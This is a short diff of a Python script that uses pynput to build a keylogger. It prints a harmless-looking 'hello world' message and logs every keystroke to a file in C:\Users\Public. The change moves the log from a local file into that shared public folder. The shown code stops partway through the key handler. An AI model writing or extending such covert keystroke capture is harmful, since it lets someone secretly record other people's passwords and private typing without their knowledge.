@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 print("hello world in terminal")
-logging.basicConfig(filename=("check"), level=logging.DEBUG, format='%(message)s')
+logging.basicConfig(filename=r'C:\Users\Public\check', level=logging.DEBUG, format='%(message)s')
 
 def while_press(key):
     key_str = f"{key}"
